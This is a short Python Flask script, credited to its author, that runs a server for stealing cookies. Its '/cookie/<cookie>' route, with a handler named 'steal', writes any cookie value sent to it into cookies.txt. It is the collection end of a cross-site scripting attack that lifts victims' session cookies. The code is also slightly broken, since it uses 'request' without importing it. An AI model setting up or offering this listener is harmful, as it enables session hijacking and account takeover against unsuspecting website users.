
from flask import Flask
app = Flask(__name__)
@app.route('/')
def index():
	return 'Hello ^_^'
@app.route('/cookie/<cookie>',methods=['GET','POST'])
def steal(cookie):
	if request.method == "GET" or request.method == "POST":
		with open('cookies.txt',mode='a') as f:
			f.write('\n---------------------------\n'+cookie+'\n---------------------------\n')
		print('New Cookie')
		return 'Thanks :)'
if __name__ == '__main__':
	app.run(host='0.0.0.0')
# coded by : khaled nassar @knassar702
